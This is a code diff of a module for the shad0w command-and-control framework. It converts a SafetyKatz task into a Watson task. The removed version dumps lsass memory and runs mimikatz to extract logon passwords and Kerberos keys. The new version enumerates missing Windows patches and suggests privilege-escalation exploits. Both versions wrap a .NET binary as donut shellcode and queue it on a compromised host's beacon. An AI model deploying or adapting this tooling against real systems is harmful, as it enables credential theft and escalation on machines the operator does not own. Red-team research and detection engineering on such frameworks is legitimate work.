@@ -1,26 +1,26 @@
 #
-# Execute safetykatz on a session
+# Execute watson on a session
 #
 
 import argparse
 
 from lib import shellcode
 
-__description__ = "A tool to minidump lsass then use mimikatz sekurlsa::logonpasswords & sekurlsa::ekeys on it"
-__author__ = "@_batsec_, @harmj0y"
+__description__ = "Enumerate missing KBs and suggest exploits for PrivESC"
+__author__ = "@Flangvik, @_RastaMouse"
 
 # identify the task as shellcode execute
 USERCD_EXEC_ID = 0x3000
 
-# location of safetykatz binary
-SAFETYKATZ_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SafetyKatz.exe"
+# location of watson binary
+WATSON_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/Watson.exe"
 
 # little hack but lets us pass the args to donut
 class DummyClass(object):
     def __init__(self):
         pass
 
-def safetykatz_callback(shad0w, data):
+def watson_callback(shad0w, data):
     print(data)
 
     return ""
@@ -32,23 +32,24 @@ def main(shad0w, args):
         shad0w.debug.log("ERROR: No active beacon", log=True)
         return
 
-    safetykatz_args = ' '.join(args[1:])
+    watson_args = ' '.join(args[1:])
 
     # kinda a hack to make sure we intergrate nice with the shellcode generator
     args = DummyClass()
 
-    if len(safetykatz_args) != 0:
-        args.param = safetykatz_args
+    if len(watson_args) != 0:
+        args.param = watson_args
     else:
         args.param = False
-        safetykatz_args = False
+        watson_args = False
 
     args.cls = False
     args.method = False
     args.runtime = False
     args.appdomain = False
 
-    b64_comp_data = shellcode.generate(SAFETYKATZ_BIN, args, safetykatz_args)
+    #Generate donut base64 shellcode with "AnyCpu" as target, local bin is x86
+    b64_comp_data = shellcode.generate(WATSON_BIN, args, watson_args)
 
     shad0w.beacons[shad0w.current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
-    shad0w.beacons[shad0w.current_beacon]["callback"] = safetykatz_callback
+    shad0w.beacons[shad0w.current_beacon]["callback"] = watson_callback
